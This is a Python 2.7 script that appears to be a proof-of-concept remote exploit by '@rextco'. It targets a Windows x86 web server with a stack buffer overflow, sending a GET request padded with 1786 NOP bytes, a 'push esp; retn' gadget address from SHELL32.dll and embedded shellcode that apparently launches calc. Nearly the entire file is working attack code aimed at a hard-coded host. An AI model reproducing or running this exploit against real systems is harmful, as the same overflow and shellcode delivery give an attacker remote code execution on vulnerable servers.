# Python 2.7 x86

# by @rextco
import string
import random
import struct
import socket

# shell #
shell = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"


def read_file(file_name):
    with open(file_name, "rb") as f:
        content = f.read()
    return bytearray(content)


def write_file(file_name, content):
    with open(file_name, "wb") as f:
        f.write(content)


def random_word(length):
    seed = string.ascii_uppercase + string.ascii_lowercase
    return "".join(random.choice(seed) for char in range(length))


def exploit_remote(host, port, file_cache=False):
    print("Exploit!Socket!Call")
    print("DebugMode!FileCache = {}".format(file_cache))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        print("[*] Starting connection to host: %s and port: %s" % (host, port))
        s.connect((host, port))

        get_format = "GET /{} HTTP/1.1\r\n\r\n"         # from request petition     POST, HEAD, PUT, DELETE

        if file_cache:
            stuff = read_file("debug_bad_food.txt")
        else:
            stuff = "\x90" * 1786
            stuff += struct.pack("<L", 0x7C9E56ED)      # push esp; retn
            stuff += shell
            # stuff += "\x41" * 4
            # stuff += "\x42" * 4
            write_file("debug_bad_food.txt", stuff)

        get_tcp = get_format.format(stuff)
        print("length = {:d}".format(len(get_tcp)))
        s.send(get_tcp)
        print s.recv(1024)

    except Exception as e:
        s.close()
        raise e

    s.close()


if __name__ == "__main__":
    exploit_remote(host="192.168.1.25", port=80, file_cache=False)


# Work under:
# Gadgets
# 0x7C9E56ED push esp; retn SHELL32.dll
# Address

